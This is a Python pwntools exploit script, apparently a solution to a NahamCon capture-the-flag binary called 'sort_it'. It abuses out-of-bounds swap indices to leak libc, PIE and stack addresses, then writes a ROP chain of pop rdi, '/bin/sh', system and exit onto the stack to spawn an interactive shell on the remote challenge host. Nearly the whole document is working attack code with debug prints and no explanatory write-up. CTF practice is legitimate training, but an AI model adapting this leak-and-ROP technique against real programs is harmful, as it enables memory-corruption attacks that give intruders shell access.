from pwn import *

local_bin = "./sort_it"
elf = ELF(local_bin)
libc = ELF("./libc-2.31.so")
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")

rop = ROP(libc)

p = remote("challenge.nahamcon.com", 30031)
#p = process(local_bin)

#p = gdb.debug(local_bin, '''
	#break main
	#break *main+376
	#break *print_words+83
	#break *print_words+4
	#break *main+543
	#break *main+354
	#break swap
	#break *main+420
	#break check
	#continue
	#''')

def swap(index, index_to_be_swapped):
	p.recvuntil(b"select")
	p.sendline(index)
	p.recvuntil(b"replace")
	p.sendline(index_to_be_swapped)




print("[+] Starting game!")
output = p.recvuntil(b"Press any key to continue")
print(output)
p.sendline(b"a")

swap(b'1',b'14')
output = p.recvuntil(b'1. ')
output = p.recvuntil(b'\n2.')
print(output)
leak = output[:-3]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked libc = ", hex(leak_dec))

#leak 0x7ffff7e16d
#base 0x7ffff7df0000
print("[+] Get libc leak")
offset = 0x00007ffff7e16d0a - 0x7ffff7df0000
print(offset)
libc_base = leak_dec - offset
print("[+] libc base = ", hex(libc_base))

print("[+] Swapping back")
p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'14',b'1')

print("### Why is there no leak here ###")
print("[+] Leak PIE Base to get fgets buffer postion")

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'13',b'1')
#p.interactive()
output = p.recvuntil(b'1. ')
print(output)
output = p.recvuntil(b'\n2.')
print(output)
leak = output[:-3]
print("[+] Leaked = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked PIE address = ", hex(leak_dec))

print("[+] Get PIE base address")
offset = 0x00005555555555e0 - 0x555555554000
print(offset)
PIE_base = leak_dec - offset
print("[+] PIE_base = ", hex(PIE_base))

offset = 0x555555558030 - 0x555555554000
GETS_buffer = PIE_base + offset
print("[+] GETS_buffer = ", hex(GETS_buffer))

print("[+] Swapping back")
output = p.recvuntil(b"sorted")
print(output)
p.sendline(b'n')
swap(b'13',b'1')


print("[+] Sorting it to terminate the game later")

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'3',b'1')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'5',b'2')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'3',b'4')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'6',b'10')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'8',b'4')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'7',b'5')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'9',b'6')

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'11',b'1')

print("Leaking stack address to calculate offset to libc symbols we want")
output = p.recvuntil(b'1. ')
output = p.recvuntil(b'\n2.')
print(output)
leak = output[:-3]
print("[+] Leaked stack address = ",leak)
leak_dec = int.from_bytes(leak,"little")
print("[+] leak_dec = ", (leak_dec))
print("[+] Leaked stack address = ", hex(leak_dec))

offset = 0x7fffffffe610 - 0x7fffffffe4c0
base_index = leak_dec - offset
print("[+] Leaked stack address at first index = ", hex(base_index))

p.recvuntil(b"sorted")
p.sendline(b'n')
swap(b'1',b'11')

libc.address = libc_base
BINSH = next(libc.search(b"/bin/sh")) #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

POPRDI_gadget = (rop.find_gadget(['pop rdi','ret']))[0] + libc_base
print("[+]POP RDI Gadget = ", hex(POPRDI_gadget))
print("[+] BINSH = " ,hex(BINSH))
print("[+] SYSTEM = " ,hex(SYSTEM))
print("[+] EXIT = " ,hex(EXIT))


#rsp = 0x7fffffffe528

offset = 104
#print(offset)
ret_addr = offset + base_index
print("[+] return address = " ,hex(ret_addr))

offset_to_ret_addr = (ret_addr - base_index)/ 0x8 + 1
print("[+] offset_to_ret_addr =" ,(offset_to_ret_addr))

#offset_to_ret_addr = (str(offset_to_ret_addr)[:-2])
#print("[+] offset_to_ret_addr =" ,(offset_to_ret_addr))

#fake_offset is where my rsp is
fake_offset = b''
fake_offset += str.encode(str(offset_to_ret_addr)[:-2])
print("[+] fake_offset = ", fake_offset)

'''
offset_to_POPRDI = ((base_index - POPRDI_gadget)/ 0x8) - 1 
print("[+] offset_to_POPRDI =" ,(offset_to_POPRDI))
offset_to_POPRDI = (str(offset_to_POPRDI)[:-2])
print("[+] offset_to_POPRDI =" ,(offset_to_POPRDI))
'''

offset_to_GETS = ((base_index - GETS_buffer)/0x8) - 2
print("[+] offset_to_GETS =" ,(offset_to_GETS))
offset_to_GETS = (str(offset_to_GETS)[:-2])
print("[+] offset_to_GETS =" ,(offset_to_GETS))


payload_offset = b'-'
payload_offset += str.encode(str(offset_to_GETS))
print("[+] Iteration 1")
print("[+] payload_offset = " ,payload_offset)
print("[+] fake_offset = ", fake_offset)
#swap(b'15', fake_offset)
p.recvuntil(b"sorted")
print("##################### [ swapping 1 ] #####################")

payload = b''
payload += b'n\x00'
payload += b'AAAAAA'
#payload += b'BBBBBBBB'
payload += p64(POPRDI_gadget+1, endian='little')
p.sendline(payload)
swap(payload_offset,fake_offset)

p.recvuntil(b"sorted")
print("##################### [ swapping 2 ] #####################")
offset_to_ret_addr = offset_to_ret_addr + 1
fake_offset2 = b''
fake_offset2 += str.encode(str(offset_to_ret_addr)[:-2])
payload = b''
payload += b'n\x00'
payload += b'AAAAAA'
#payload += b'BBBBBBBB'
payload += p64(POPRDI_gadget)
p.sendline(payload)
swap(payload_offset,fake_offset2)

p.recvuntil(b"sorted")

print("##################### [ swapping 3 ] #####################")
offset_to_ret_addr = offset_to_ret_addr + 1
fake_offset3 = b''
fake_offset3 += str.encode(str(offset_to_ret_addr)[:-2])
payload = b''
payload += b'n\x00'
payload += b'AAAAAA'
#payload += b'BBBBBBBB'
payload += p64(BINSH)
p.sendline(payload)
swap(payload_offset,fake_offset3)

p.recvuntil(b"sorted")
print("##################### [swapping 4 ] #####################")
offset_to_ret_addr = offset_to_ret_addr + 1
fake_offset4 = b''
fake_offset4 += str.encode(str(offset_to_ret_addr)[:-2])
payload = b''
payload += b'n\x00'
payload += b'AAAAAA'
#payload += b'BBBBBBBB'
payload += p64(SYSTEM)
p.sendline(payload)
swap(payload_offset,fake_offset4)

p.recvuntil(b"sorted")
print("##################### [swapping 5 ] #####################")
offset_to_ret_addr = offset_to_ret_addr + 1
fake_offset5 = b''
fake_offset5 += str.encode(str(offset_to_ret_addr)[:-2])
payload = b''
payload += b'n\x00'
payload += b'AAAAAA'
#payload += b'BBBBBBBB'
payload += p64(EXIT)
p.sendline(payload)
swap(payload_offset,fake_offset5)

#swap(b'-2', fake_offset)



'''
Possible gadgets to make rdi 
x0016e680[0m: [92mmov edi, dword [rbp+0x10] ; add rdi, rbx ; call r12 ;
#-1 is stack index - 0x8
#-2 is stack index - 0x10

gets_buffer = 0x555555558030

'''
#p.interactive()


output = p.recvuntil(b"sorted")
print(output)
p.sendline(b'y')









p.interactive()